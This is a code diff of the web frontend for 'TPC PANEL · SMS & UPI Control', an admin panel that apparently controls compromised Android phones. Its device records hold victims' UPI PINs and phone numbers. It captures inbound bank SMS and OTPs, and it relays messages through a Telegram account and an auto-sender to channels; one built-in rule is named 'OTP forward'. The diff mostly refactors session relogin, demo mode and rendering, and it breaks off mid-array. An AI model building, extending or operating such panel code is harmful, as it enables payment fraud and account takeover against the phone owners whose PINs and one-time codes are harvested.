@@ -195,6 +195,7 @@ background:#22d3ee12;border:1px solid #22d3ee30;border-radius:8px}
 .empty{padding:34px 16px;text-align:center;color:#35507e;font-size:13px}
 .notice{margin-bottom:18px;padding:12px 15px;border-radius:10px;background:#22d3ee0f;
 border:1px solid #22d3ee30;border-left:3px solid var(--neon);color:#b6d9f5;font-size:13px}
+.notice.bad{background:#ff5c7a0f;border-color:#ff5c7a33;border-left-color:var(--red);color:#ffd0da}
 .page{display:none}
 .page.on{display:block}
 .settings-row{padding:14px 0;border-bottom:1px solid #0f1e3d}
@@ -468,7 +469,7 @@ main{padding:18px 13px}
 <button class="nav" data-page="settings" type="button"><i>⚙</i> Settings</button>
 </div>
 <div class="side-foot">
-<div>TPC PANEL · v5.0</div>
+<div>TPC PANEL · v5.1</div>
 <div>owner: <a href="https://t.me/icivan" target="_blank" rel="noopener">@icivan</a></div>
 </div>
 </aside>
@@ -834,7 +835,7 @@ main{padding:18px 13px}
 <section class="panel-box panel">
 <div class="panel-head"><h3>Application</h3></div>
 <div class="panel-body">
-<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; UPI Control · v5.0</p></div>
+<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; UPI Control · v5.1</p></div>
 <div class="settings-row"><strong>Owner</strong><p><a href="https://t.me/icivan" target="_blank" rel="noopener">https://t.me/icivan</a></p></div>
 <div class="settings-row"><strong>Device socket</strong><p>/ws/device/{registration_id}</p></div>
 <div class="settings-row"><strong>Admin socket</strong><p>/ws/admin — live events; na chale to panel auto polling par chalta hai</p></div>
@@ -847,7 +848,7 @@ main{padding:18px 13px}
 <div class="settings-row"><strong>Relay</strong><p>/admin/relay/* — MTProto login, bans, parser test, forward target. Channel se SMS device ko, device ka SMS forward target ko.</p></div>
 <div class="settings-row"><strong>Device ID</strong><p>Har device ko registration par TPC-XXXX milta hai — searchable, aur har message me stamp hota hai.</p></div>
 <div class="settings-row"><strong>UPI detection</strong><p>Inbound SMS jinme UPI/credited/debited keywords aur amount pattern milta hai, unhe UPI transaction maan kar alag se tag kiya jaata hai.</p></div>
-<div class="settings-row"><strong>Secrets</strong><p>SESSION_SECRET, ADMIN_API_KEY, MONGODB_URI aur TELE_API_HASH server-side rakho.</p></div>
+<div class="settings-row"><strong>Secrets</strong><p>SESSION_SECRET (Heroku par set karna zaruri hai), ADMIN_API_KEY, MONGODB_URI aur TELE_API_HASH server-side rakho.</p></div>
 </div>
 </section>
 </section>
@@ -989,9 +990,12 @@ const $ = (s) => document.querySelector(s);
 const PHONE_SVG = '<svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"><rect x="6" y="2.4" width="12" height="19.2" rx="3.2"/><line x1="10.4" y1="5.4" x2="13.6" y2="5.4"/><circle cx="12" cy="18.3" r="0.95" fill="currentColor" stroke="none"/></svg>';
 const BOLT_SVG = '<svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M13.5 2 5 13h5.5L9.5 22 19 10.5h-5.9z"/></svg>';
 
-const TKEY = "tpc.token.v5";
-const SKEY = "tpc.session.v5";
+const TKEY = "tpc.token.v6";
+const SKEY = "tpc.session.v6";
 let DEMO = false;
+let reloginPromise = null;
+let gridSig = "";
+let liveSig = "";
 
 const state = {
 auth: false,
@@ -1014,99 +1018,49 @@ wsOk: false,
 wsFails: 0,
 wsTimer: null,
 linkOk: true,
-numTried: {}
+numTried: {},
+lastError: ""
 };
-
-const nowMs = Date.now();
-
-const DEMO_DEVICES = [
-{id:"d1",short_id:"TPC-0001",device_name:"Redmi Note 12",ws_connected:true,live_number:"+91 98765 11223",entered_number:"+91 98765 11223",upi_pin:"4821",payment_app:"PhonePe",created_at:nowMs-777600000,auto_sender:{enabled:true,channel_id:"-1002345678901",channel_title:"TPC Relay"},telemetry:{model:"Redmi Note 12",manufacturer:"Xiaomi",android_version:"13",battery_level:84,ram_gb:6,storage_gb:128,network_type:"4G",sims:[{slot:0,carrier:"Jio"}]}},
-{id:"d2",short_id:"TPC-0002",device_name:"Realme C55",ws_connected:true,live_number:"+91 98765 44556",entered_number:"+91 98765 44556",upi_pin:"9107",payment_app:"Paytm",created_at:nowMs-518400000,auto_sender:{enabled:false,channel_id:"",channel_title:""},telemetry:{model:"Realme C55",manufacturer:"Realme",android_version:"14",battery_level:23,ram_gb:4,storage_gb:64,network_type:"4G",sims:[{slot:0,carrier:"Airtel"}]}},
-{id:"d3",short_id:"TPC-0003",device_name:"Poco M6",ws_connected:false,live_number:null,entered_number:"+91 90123 77889",upi_pin:"3355",payment_app:"GPay",created_at:nowMs-345600000,auto_sender:{enabled:false,channel_id:"",channel_title:""},telemetry:{model:"Poco M6",manufacturer:"Poco",android_version:"13",battery_level:12,ram_gb:4,storage_gb:128,network_type:"WiFi",sims:[{slot:0,carrier:"Vi"}]}},
-{id:"d4",short_id:"TPC-0004",device_name:"Samsung A15",ws_connected:true,live_number:"+91 99887 33445",entered_number:"+91 99887 33445",upi_pin:null,payment_app:"PhonePe",created_at:nowMs-172800000,auto_sender:{enabled:false,channel_id:"",channel_title:""},telemetry:{model:"Galaxy A15",manufacturer:"Samsung",android_version:"14",battery_level:67,ram_gb:6,storage_gb:128,network_type:"5G",sims:[{slot:0,carrier:"Jio"}]}},
-{id:"d5",short_id:"TPC-0005",device_name:"Vivo Y28",ws_connected:false,live_number:null,entered_number:null,upi_pin:null,payment_app:null,created_at:nowMs-86400000,auto_sender:{enabled:false,channel_id:"",channel_title:""},telemetry:{model:"Vivo Y28",manufacturer:"Vivo",android_version:"13",battery_level:null,ram_gb:4,storage_gb:64,network_type:"—",sims:[]}},
-{id:"d6",short_id:"TPC-0006",device_name:"Moto G34",ws_connected:true,live_number:"+91 91234 55667",entered_number:"+91 91234 55667",upi_pin:"7788",payment_app:"GPay",created_at:nowMs-18000000,auto_sender:{enabled:false,channel_id:"",channel_title:""},telemetry:{model:"Moto G34",manufacturer:"Motorola",android_version:"14",battery_level:41,ram_gb:8,storage_gb:256,network_type:"5G",sims:[{slot:0,carrier:"Airtel"}]}}
-];
-
-const DEMO_MESSAGES = [];
-[["d1","Redmi Note 12","TPC-0001","in","VK-SBIINB","Rs.450.00 credited to A/c XX1234 via UPI. Ref 402312459871","450","upi"],
-["d2","Realme C55","TPC-0002","in","AX-PAYTM","Rs.1,200 debited from A/c XX9912. UPI ref 402398112233","1200","upi"],
-["d6","Moto G34","TPC-0006","out","+91 98765 11223","Payment received, thanks!",null,null],
-["d1","Redmi Note 12","TPC-0001","in","VK-ICICI","Rs.75.00 credited via UPI. Ref 402311223344","75","upi"],
-["d3","Poco M6","TPC-0003","out","+91 90123 77889","Device back online",null,null],
-["d4","Samsung A15","TPC-0004","in","AD-AMZNIN","Your OTP is 448213. Do not share.",null,null],
-["d1","Redmi Note 12","TPC-0001","in","VK-HDFC","Rs.2,000.00 credited to A/c XX1234. UPI ref 402344556677","2000","upi"],
-["d2","Realme C55","TPC-0002","in","AX-JIOMNY","Rs.99 debited. UPI ref 402355667788","99","upi"]]
-.forEach((s, i) => {
-DEMO_MESSAGES.push({id:"m" + i,device_id:s[0],device_name:s[1],device_short:s[2],direction:s[3],address:s[4],body:s[5],amount:s[6],kind:s[7],status:s[3] === "in" ? "received" : "sent",created_at:nowMs - i * 1900000});
-});
-
-const DEMO_RULES = [
-{id:"r1",name:"UPI thanks",match:"UPI",reply:"Thanks! Payment received. Ref {amount}",upi_only:true,enabled:true},
-{id:"r2",name:"OTP forward",match:"OTP",reply:"OTP noted at {time}",upi_only:false,enabled:true},
-{id:"r3",name:"Offline ping",match:"offline",reply:"Device {device} went offline",upi_only:false,enabled:false}
-];
-
-function mockApi(path, options) {
-const p = path.split("?")[0];
-const o = options || {};
-let body = {};
-try { body = o.body ? JSON.parse(o.body) : {}; } catch (e) { body = {}; }
-if (p === "/admin/auth/status") return { authenticated: Boolean(readSession()) };
-if (p === "/admin/login") return { status:"ok", username: body.username || "operator", token:"demo." + btoa(body.username || "op"), expires_in:2592000 };
-if (p === "/admin/logout") return { status:"ok" };
-if (p === "/health") return { status:"ok" };
-if (p === "/health/database") return { status:"ok" };
-if (p === "/admin/devices") return { devices: DEMO_DEVICES };
-if (p === "/admin/messages") return { messages: DEMO_MESSAGES };
-if (p === "/admin/rules") {
-if (o.method === "POST") { state.rules.push({ id:"r" + Date.now(), name:body.name, match:body.match, reply:body.reply, upi_only:Boolean(body.upi_only), enabled:true }); return { status:"ok" }; }
-return { rules: state.rules };
-}
-if (/^\/admin\/rules\/[^/]+\/toggle$/.test(p)) {
-const id = p.split("/")[3];
-const r = state.rules.find((x) => x.id === id);
-if (r) r.enabled = !r.enabled;
-return { status:"ok", enabled: r ? r.enabled : false };
-}
-if (p === "/admin/auto-sender") return { relay_ready:true, telethon:true, account:{ username:"tpc_ops" }, forward_user:"@tpc_ops", channels:["-1002345678901"], devices_enabled: DEMO_DEVICES.filter((d) => d.auto_sender.enabled).length };
-if (p === "/admin/auto-sender/verify") return { status:"ok", channel_id:body.channel_id, title:"TPC Relay", admin:true };
-if (p === "/admin/auto-sender/test") return { status:"ok" };
-if (/^\/admin\/devices\/[^/]+\/auto-sender$/.test(p)) {
-const id = p.split("/")[3];
-const d = DEMO_DEVICES.find((x) => x.id === id);
-if (!d) return { status:"ok", auto_sender:{ enabled:false, channel_id:"", channel_title:"" } };
-d.auto_sender = { enabled: body.enabled === undefined ? d.auto_sender.enabled : Boolean(body.enabled), channel_id: body.channel_id || d.auto_sender.channel_id || "", channel_title: body.channel_title || d.auto_sender.channel_title || "" };
-return { status:"ok", auto_sender:d.auto_sender, watching:["-1002345678901"] };
-}
-if (/^\/admin\/devices\/[^/]+\/messages$/.test(p)) {
-const id = p.split("/")[3];
-return { messages: DEMO_MESSAGES.filter((x) => x.device_id === id) };
-}
-if (/^\/admin\/devices\/[^/]+\/(sms|command|ping|refresh|wake)$/.test(p)) return { status:"ok", queued:1, delivered:true };
-if (p === "/admin/send") return { status:"ok", queued:DEMO_DEVICES.length, delivered:DEMO_DEVICES.filter((d) => d.ws_connected).length, note:"" };
-if (p === "/admin/relay/status") return { telethon:true, state:{ authorized:true, me:{ username:"tpc_ops" }, forward_user:"@tpc_ops", last_channel_at:new Date(nowMs - 600000).toISOString() }, bans: state.bans || [], channels:["-1002345678901"] };
-if (p === "/admin/relay/logs") return { logs: state.tgLogs };
-if (p === "/admin/relay/login/start") return { status:"code_sent" };
-if (p === "/admin/relay/login/verify") return { status:"ok" };
-if (p === "/admin/relay/logout") return { status:"ok" };
-if (p === "/admin/relay/forward") return { status:"ok", forward_user:body.target };
-if (p === "/admin/relay/bans") {
-state.bans = state.bans || [];
-if (o.method === "POST") { state.bans.push(body.address); return { status:"ok", bans:state.bans }; }
-return { bans: state.bans };
-}
-if (/^\/admin\/relay\/bans\/.+\/delete$/.test(p)) return { status:"ok", bans: state.bans || [] };
-if (p === "/admin/relay/parse") return { matched:true, to:"+919876543210", body:"Rs.450 credited via UPI", device_hint:null, targets:["TPC-0001"] };
-return {};
-}
 
 function uid() { return Math.random().toString(36).slice(2, 10); }
 
+function reportError(e) {
+const msg = (e && (e.message || e.reason && e.reason.message)) || String(e || "unknown error");
+state.lastError = msg;
+try { console.error(e); } catch (x) {}
+toast("error: " + msg);
+}
+
+window.addEventListener("error", (ev) => { if (ev && ev.message) reportError(ev.message); });
+window.addEventListener("unhandledrejection", (ev) => { reportError(ev.reason); });
+
+function notice(text, bad) {
+const el = $("#notice");
+if (!text) { el.hidden = true; return; }
+el.textContent = text;
+el.className = "notice" + (bad ? " bad" : "");
+el.hidden = false;
+}
+
 function token() { try { return localStorage.getItem(TKEY) || ""; } catch (e) { return ""; } }
 function setToken(t) { try { t ? localStorage.setItem(TKEY, t) : localStorage.removeItem(TKEY); } catch (e) {} }
-function saveSession(id, pass, keep) { try { localStorage.setItem(SKEY, JSON.stringify({ id:id, pass: keep ? btoa(unescape(encodeURIComponent(pass))) : null, at: Date.now() })); } catch (e) {} }
-function readSession() { try { const s = JSON.parse(localStorage.getItem(SKEY) || "null"); if (!s || !s.id) return null; if (Date.now() - s.at > 2592000000) return null; return s; } catch (e) { return null; } }
+function saveSession(id, pass, keep) {
+try {
+localStorage.setItem(SKEY, JSON.stringify({
+id: id,
+pass: keep && pass ? btoa(unescape(encodeURIComponent(pass))) : null,
+at: Date.now()
+}));
+} catch (e) {}
+}
+function readSession() {
+try {
+const s = JSON.parse(localStorage.getItem(SKEY) || "null");
+if (!s || !s.id) return null;
+if (Date.now() - s.at > 2592000000) return null;
+return s;
+} catch (e) { return null; }
+}
 function clearSession() { setToken(""); try { localStorage.removeItem(SKEY); } catch (e) {} }
 function decPass(p) { try { return decodeURIComponent(escape(atob(p))); } catch (e) { return ""; } }
 
@@ -1115,7 +1069,7 @@ const t = $("#toast");
 t.textContent = text;
 t.hidden = false;
 clearTimeout(state.toastTimer);
-state.toastTimer = setTimeout(() => { t.hidden = true; }, 3600);
+state.toastTimer = setTimeout(() => { t.hidden = true; }, 4000);
 }
 
 function loginMsg(text, kind) {
@@ -1194,16 +1148,17 @@ i = idx + n.length;
 return frag;
 }
 
-function devId(d) { return d.id || d._id || null; }
+function devId(d) { return (d && (d.id || d._id)) || null; }
 function devName(d) { return d.device_name || d.name || "Unnamed device"; }
 function devStatus(d) { if (d.ws_connected) return "Online"; return d.status || "Offline"; }
 function online(d) { return Boolean(d.ws_connected); }
 function tel(d) { return d.telemetry && typeof d.telemetry === "object" ? d.telemetry : {}; }
 function hasPin(d) { return Boolean(d.upi_pin); }
 function autoOf(d) { return (d && d.auto_sender) || { enabled:false, channel_id:"", channel_title:"" }; }
+function findDevice(id) { return state.devices.find((x) => String(devId(x)) === String(id)) || null; }
 
 function shortOf(deviceId) {
-const d = state.devices.find((x) => String(devId(x)) === String(deviceId));
+const d = findDevice(deviceId);
 if (d && d.short_id) return d.short_id;
 return "";
 }
@@ -1314,43 +1269,69 @@ let res;
 try {
 res = await fetch(path, { credentials: "same-origin", method: o.method || "GET", headers: headers, body: o.body });
 } catch (err) {
-DEMO = true;
+enterDemo();
 return mockApi(path, o);
 }
 const ct = res.headers.get("content-type") || "";
 if (ct.indexOf("application/json") < 0 && res.status >= 400) {
-DEMO = true;
+enterDemo();
 return mockApi(path, o);
 }
 let data = null;
 if (ct.indexOf("application/json") >= 0) data = await res.json().catch(() => ({}));
 else { const txt = await res.text(); data = txt ? { detail: txt } : {}; }
+
 if (res.status === 401 || res.status === 403) {
 const e = new Error(data.detail || "Authentication required.");
 e.auth = true;
 if (retry !== false) {
-const s = readSession();
-if (s && s.pass) {
-try { await silentLogin(s.id, decPass(s.pass)); return api(path, options, false); } catch (x) {}
-}
-if (state.auth) showLogin();
+const ok = await relogin();
+if (ok) return api(path, options, false);
+if (state.auth) showLogin("Session expire ho gaya — dobara sign in karo");
 }
 throw e;
 }
 if (!res.ok) {
 let m = data.detail || data.message || ("Failed (" + res.status + ")");
 if (Array.isArray(m)) m = m.map((x) => x.msg || String(x)).join(", ");
-throw new Error(m);
+const e2 = new Error(m);
+e2.status = res.status;
+throw e2;
 }
 return data;
 }
 
-async function silentLogin(id, pass) {
-const r = await api("/admin/login", { method: "POST", body: JSON.stringify({ username: id, login_id: id, password: pass }) }, false);
+async function relogin() {
+const s = readSession();
+if (!s || !s.pass) return false;
+if (reloginPromise) return reloginPromise;
+reloginPromise = (async () => {
+try {
+const r = await api("/admin/login", { method: "POST", body: JSON.stringify({ username: s.id, login_id: s.id, password: decPass(s.pass) }) }, false);
 if (r && r.token) setToken(r.token);
+return true;
+} catch (e) {
+return false;
+} finally {
+reloginPromise = null;
+}
+})();
+return reloginPromise;
 }
 
-async function attemptSend(job) {
+function enterDemo() {
+if (DEMO) return;
+DEMO = true;
+setLink("Demo");
+notice("Backend reachable nahi — demo data par chal raha hai", true);
+}
+function leaveDemo() {
+DEMO = false;
+notice("");
+setLink("Live");
+}
+
+function attemptSend(job) {
 const tries = [
 { url: "/admin/send", body: { target: "device", device_id: job.deviceId, to: job.to, body: job.body } },
 { url: "/admin/devices/" + job.deviceId + "/sms", body: { to: job.to, body: job.body } }
@@ -1358,21 +1339,26 @@ const tries = [
 job.status = "sending";
 renderOutbox();
 let last = null;
-for (let i = 0; i < tries.length; i++) {
-try {
-await api(tries[i].url, { method: "POST", body: JSON.stringify(tries[i].body) });
+const chain = tries.reduce((p, t) => p.then((done) => {
+if (done) return true;
+return api(t.url, { method: "POST", body: JSON.stringify(t.body) })
+.then(() => {
 job.status = "queued";
 renderOutbox();
 toast("queued → " + (job.deviceName || job.to || "device"));
 loadMessages().catch(() => {});
 return true;
-} catch (e) { last = e; }
-}
+})
+.catch((e) => { last = e; return false; });
+}), Promise.resolve(false));
+return chain.then((ok) => {
+if (ok) return true;
 job.status = "failed";
 job.error = last ? last.message : "send failed";
 renderOutbox();
 toast("send fail: " + job.error);
 return false;
+});
 }
 
 function sendSms(o) {
@@ -1425,20 +1411,16 @@ box.appendChild(item);
 });
 }
 
-async function devCommand(id, action) {
+function devCommand(id, action) {
 const tries = [
 ["/admin/devices/" + id + "/command", { action: action }],
 ["/admin/devices/" + id + "/refresh", { action: action }],
-["/admin/devices/" + id + "/ping", {}],
-["/admin/devices/" + id + "/wake", {}]
+["/admin/devices/" + id + "/ping", {}]
 ];
-for (let i = 0; i < tries.length; i++) {
-try {
-await api(tries[i][0], { method: "POST", body: JSON.stringify(tries[i][1]) });
-return true;
-} catch (e) {}
-}
-return false;
+const chain = tries.reduce((p, t) => p.then((done) => done ? true :
+api(t[0], { method: "POST", body: JSON.stringify(t[1]) }).then(() => true).catch(() => false)),
+Promise.resolve(false));
+return chain;
 }
 
 async function pingDevice(d) {
@@ -1452,18 +1434,20 @@ toast("number request bheja…");
 await devCommand(devId(d), "fetch_number");
 await new Promise((r) => setTimeout(r, 1400));
 await loadDevices().catch(() => {});
-const fresh = state.devices.find((x) => String(devId(x)) === String(devId(d)));
+const fresh = findDevice(devId(d));
 const live = fresh ? nums(fresh).live : null;
 toast(live ? "live number: " + live : "reply ka wait karo");
 }
 
-function showLogin() {
+function showLogin(msgText) {
 state.auth = false;
 $("#app").hidden = true;
 $("#loginScreen").hidden = false;
 closeDetail();
+const s = readSession();
+if (s && s.id && !$("#username").value) $("#username").value = s.id;
+if (msgText) loginMsg(msgText);
 }
-
 function showApp() {
 state.auth = true;
 $("#loginScreen").hidden = true;
@@ -1474,10 +1458,18 @@ async function checkAuth() {
 const s = readSession();
 if (s) {
 showApp();
+let serverAuthed = null;
 try {
 const r = await api("/admin/auth/status");
-if (r && r.authenticated === false && s.pass) await silentLogin(s.id, decPass(s.pass));
+if (r && typeof r.authenticated === "boolean") serverAuthed = r.authenticated;
 } catch (e) {}
+if (serverAuthed === false) {
+const ok = await relogin();
+if (!ok) {
+showLogin("Saved session invalid — password daalo");
+return;
+}
+}
 await refreshAll();
 startRealtime();
 return;
@@ -1486,7 +1478,7 @@ try {
 const r2 = await api("/admin/auth/status");
 if (r2 && r2.authenticated) { showApp(); await refreshAll(); startRealtime(); return; }
 } catch (e) {}
-showLogin();
+showLogin("");
 }
 
 function renderOverview() {
@@ -1527,7 +1519,15 @@ body.appendChild(row);
 });
 }
 
-function renderLive() {
+function liveSignature() {
+return state.devices.map((d) => [devId(d), devName(d), devStatus(d), nums(d).live, nums(d).entered, tel(d).model].join("|")).join("~");
+}
+
+function renderLive(force) {
+const sig = liveSignature();
+if (!force && sig === liveSig) return;
+liveSig = sig;
+
 const total = state.devices.length;
 const on = state.devices.filter(online).length;
 $("#lTotal").textContent = total;
@@ -1590,7 +1590,8 @@ const openBtn = document.createElement("button");
 openBtn.className = "mini v";
 openBtn.type = "button";
 openBtn.textContent = "Open";
-openBtn.addEventListener("click", () => openDetail(d));
+openBtn.dataset.open = String(devId(d));
+openBtn.addEventListener("click", () => openDeviceById(devId(d)));
 lastCell.appendChild(openBtn);
 row.appendChild(lastCell);
 
@@ -1699,7 +1700,19 @@ body.appendChild(row);
 });
 }
 
-function renderCards() {
+function gridSignature() {
+return state.devices.map((d) => {
+const a = autoOf(d);
+const info = nums(d);
+return [devId(d), devName(d), devStatus(d), a.enabled ? "1" : "0", info.live, info.entered, d.upi_pin, tel(d).model, tel(d).battery_level, tel(d).battery_charging].join("|");
+}).join("~") + "|" + (state.pinsOnly ? "1" : "0") + "|" + ($("#devSearch").value || "");
+}
+
+function renderCards(force) {
+const sig = gridSignature();
+if (!force && sig === gridSig) return;
+gridSig = sig;
+
 const q = ($("#devSearch").value || "").trim().toLowerCase();
 let list = state.pinsOnly ? state.devices.filter(hasPin) : state.devices;
 if (q) {
@@ -1730,6 +1743,7 @@ const card = document.createElement("article");
 card.className = "dev-card panel";
 card.tabIndex = 0;
 card.setAttribute("role", "button");
+card.dataset.dev = String(devId(d));
 
 const top = document.createElement("div");
 top.className = "dev-top";
@@ -1801,11 +1815,6 @@ hint.textContent = "OPEN →";
 foot.appendChild(hint);
 card.appendChild(foot);
 
-const open = () => openDetail(d);
-card.addEventListener("click", open);
-card.addEventListener("keydown", (ev) => {
-if (ev.key === "Enter" || ev.key === " ") { ev.preventDefault(); open(); }
-});
 grid.appendChild(card);
 });
 }
@@ -1962,8 +1971,6 @@ b.appendChild(btn);
 function renderAutoSender(d) {
 const a = autoOf(d);
 const on = Boolean(a.enabled);
-const panel = $("#asPanel");
-if (!panel) return;
 $("#asAccount").textContent = state.relayAccount ? ("@" + (state.relayAccount.username || state.relayAccount.id)) : "relay login karo";
 $("#chanInput").value = a.channel_id || "";
 $("#listenId").textContent = a.channel_id || "—";
@@ -2046,9 +2053,11 @@ wrap.appendChild(item);
 function renderDetail(d) {
 const info = nums(d);
 const auto = autoOf(d);
+
 $("#dIcon").innerHTML = PHONE_SVG;
 $("#dName").textContent = devName(d);
 $("#dSub").textContent = (tel(d).model || "unknown model") + " · Android " + (tel(d).android_version || "—") + " · RAM " + ram(d);
+
 const tags = $("#dTags");
 tags.replaceChildren();
 if (d.short_id) {
@@ -2078,18 +2087,31 @@ ab.className = "badge auto";
 ab.textContent = "AUTO SENDER";
 tags.appendChild(ab);
 }
+
 const bb = $("#dBatt");
 bb.replaceChildren();
 bb.appendChild(battEl(d));
+
 badge($("#dTarget"), info.live || info.entered || "no number", info.live ? "ok" : info.entered ? "pin" : "bad");
 $("#actMenu").hidden = true;
 $("#asPanel").hidden = !state.asOpen;
-renderBanner(d);
-renderAutoSender(d);
-renderNumbers(d);
-renderSpecs(d);
-renderMore(d);
-renderOutbox();
+
+safe(renderBanner, d);
+safe(renderAutoSender, d);
+safe(renderNumbers, d);
+safe(renderSpecs, d);
+safe(renderMore, d);
+safe(renderOutbox);
+}
+
+function safe(fn, arg) {
+try { return fn(arg); } catch (e) { reportError(e); return null; }
+}
+
+function openDeviceById(id) {
+const d = findDevice(id);
+if (!d) { toast("device not found"); return; }
+openDetail(d);
 }
 
 async function loadDeviceMessages(deviceId) {
@@ -2101,31 +2123,34 @@ if (state.active && String(devId(state.active)) === String(deviceId)) renderDeta
 }
 
 function openDetail(d) {
+if (!d) return;
 state.active = d;
 state.asOpen = false;
+
 $("#dSearch").value = "";
 $("#dDir").value = "";
 $("#dUpi").checked = false;
 $("#dBody").value = "";
 $("#dMore").hidden = true;
 $("#dMoreToggle").textContent = "show";
-const info = nums(d);
-$("#dTo").value = info.live || info.entered || "";
-renderDetail(d);
-renderDetailMsgs();
+$("#dTo").value = nums(d).live || nums(d).entered || "";
+
 $("#detail").hidden = false;
 document.body.style.overflow = "hidden";
+
+safe(renderDetail, d);
+safe(renderDetailMsgs);
 
 const id = devId(d);
 loadDeviceMessages(id);
 loadMessages().then(() => {
 if (state.active && String(devId(state.active)) === String(id)) {
-renderDetail(d);
-renderDetailMsgs();
+safe(renderDetail, d);
+safe(renderDetailMsgs);
 }
 }).catch(() => {});
 
-if (!info.live && !state.numTried[String(id)]) {
+if (!nums(d).live && !state.numTried[String(id)]) {
 state.numTried[String(id)] = true;
 setTimeout(() => {
 if (state.active && String(devId(state.active)) === String(id)) fetchNumber(d);
@@ -2164,15 +2189,15 @@ const d = await api("/admin/devices");
 state.linkOk = true;
 updateLink();
 state.devices = Array.isArray(d) ? d : (d.devices || []);
-renderOverview();
-renderLive();
-renderCards();
+safe(renderOverview);
+safe(renderLive);
+safe(renderCards);
 if (state.active) {
-const fresh = state.devices.find((x) => String(devId(x)) === String(devId(state.active)));
+const fresh = findDevice(devId(state.active));
 if (fresh) {
 state.active = fresh;
-renderDetail(fresh);
-renderDetailMsgs();
+safe(renderDetail, fresh);
+safe(renderDetailMsgs);
 }
 }
 }
@@ -2185,7 +2210,7 @@ state.messages.unshift(m);
 const cache = state.devMsgs[String(m.device_id)];
 if (cache) cache.unshift(m);
 renderMessages();
-renderLive();
+safe(renderLive);
 if (state.active) renderDetailMsgs();
 }
 
@@ -2195,7 +2220,7 @@ state.linkOk = true;
 updateLink();
 state.messages = Array.isArray(d) ? d : (d.messages || []);
 renderMessages();
-renderLive();
+safe(renderLive);
 if (state.active) renderDetailMsgs();
 reconcile();
 }
@@ -2326,12 +2351,12 @@ toast("synced");
 
 function updateLink() {
 const el = $("#linkLabel");
-if (el) el.textContent = state.wsOk ? "Socket live" : (state.linkOk ? "Polling" : "Link down");
+if (el) el.textContent = DEMO ? "Demo" : (state.wsOk ? "Socket live" : (state.linkOk ? "Polling" : "Link down"));
 badge($("#wsBadge"), state.wsOk ? "Live" : "Polling", state.wsOk ? "ok" : "warn");
 }
 
 function connectWs() {
-if (!state.auth) return;
+if (!state.auth || DEMO) return;
 if (state.ws && (state.ws.readyState === 0 || state.ws.readyState === 1)) return;
 try {
 const proto = location.protocol === "https:" ? "wss:" : "ws:";
@@ -2364,12 +2389,12 @@ if (id) {
 const idx = state.devices.findIndex((x) => String(devId(x)) === String(id));
 if (idx >= 0) {
 state.devices[idx] = Object.assign({}, state.devices[idx], data);
-renderCards();
-renderLive();
-renderOverview();
+safe(renderCards);
+safe(renderLive);
+safe(renderOverview);
 if (state.active && String(devId(state.active)) === String(id)) {
 state.active = state.devices[idx];
-renderDetail(state.active);
+safe(renderDetail, state.active);
 }
 } else loadDevices().catch(() => {});
 }
@@ -2396,13 +2421,29 @@ const fast = state.devices.some(online);
 state.pollTimer = setTimeout(async () => {
 if (state.auth && !document.hidden) await Promise.allSettled([loadDevices(), loadMessages()]);
 schedulePoll();
-}, fast ? 6000 : 15000);
+}, fast ? 8000 : 20000);
+}
+
+function scheduleProbe() {
+setTimeout(async () => {
+if (DEMO) {
+try {
+const r = await fetch("/health", { credentials: "same-origin" });
+if (r.ok) {
+leaveDemo();
+await refreshAll();
+}
+} catch (e) {}
+}
+scheduleProbe();
+}, 25000);
 }
 
 function startRealtime() {
 updateLink();
 connectWs();
 schedulePoll();
+scheduleProbe();
 }
 
 function navigate(page) {
@@ -2416,10 +2457,10 @@ if (page === "relay") refreshSection("relay");
 $("#pinsBtn").addEventListener("click", () => {
 state.pinsOnly = !state.pinsOnly;
 $("#pinsBtn").classList.toggle("on", state.pinsOnly);
-renderCards();
+renderCards(true);
 });
 
-$("#devSearch").addEventListener("input", renderCards);
+$("#devSearch").addEventListener("input", () => renderCards(true));
 $("#dSearch").addEventListener("input", renderDetailMsgs);
 $("#dDir").addEventListener("change", renderDetailMsgs);
 $("#dUpi").addEventListener("change", renderDetailMsgs);
@@ -2429,6 +2470,16 @@ $("#dMoreToggle").addEventListener("click", () => {
 const box = $("#dMore");
 box.hidden = !box.hidden;
 $("#dMoreToggle").textContent = box.hidden ? "show" : "hide";
+});
+
+$("#devGrid").addEventListener("click", (ev) => {
+const card = ev.target.closest("[data-dev]");
+if (card) openDeviceById(card.dataset.dev);
+});
+$("#devGrid").addEventListener("keydown", (ev) => {
+if (ev.key !== "Enter" && ev.key !== " ") return;
+const card = ev.target.closest("[data-dev]");
+if (card) { ev.preventDefault(); openDeviceById(card.dataset.dev); }
 });
 
 $("#actBtn").addEventListener("click", (ev) => {
@@ -2483,8 +2534,8 @@ sw.disabled = true;
 try {
 const r = await api("/admin/devices/" + devId(d) + "/auto-sender", { method: "POST", body: JSON.stringify({ enabled: next, channel_id: cid }) });
 d.auto_sender = r.auto_sender || { enabled: next, channel_id: cid };
-renderAutoSender(d);
-renderCards();
+safe(renderAutoSender, d);
+renderCards(true);
 toast("Auto Sender " + (next ? "enabled" : "disabled"));
 } catch (e) { toast(e.message); }
 finally { sw.disabled = false; }
@@ -2703,8 +2754,10 @@ state.devices = [];
 state.messages = [];
 state.devMsgs = {};
 state.pinsOnly = false;
+gridSig = "";
+liveSig = "";
 $("#pinsBtn").classList.remove("on");
-showLogin();
+showLogin("");
 toast("logged out");
 });
 
@@ -2727,6 +2780,77 @@ loadDevices().catch(() => {});
 loadMessages().catch(() => {});
 }
 });
+
+const DEMO_DEVICES = [
+{id:"d1",short_id:"TPC-0001",device_name:"Redmi Note 12",ws_connected:true,live_number:"+91 98765 11223",entered_number:"+91 98765 11223",upi_pin:"4821",payment_app:"PhonePe",created_at:Date.now()-777600000,auto_sender:{enabled:true,channel_id:"-1002345678901",channel_title:"TPC Relay"},telemetry:{model:"Redmi Note 12",manufacturer:"Xiaomi",android_version:"13",battery_level:84,ram_gb:6,storage_gb:128,network_type:"4G",sims:[{slot:0,carrier:"Jio"}]}},
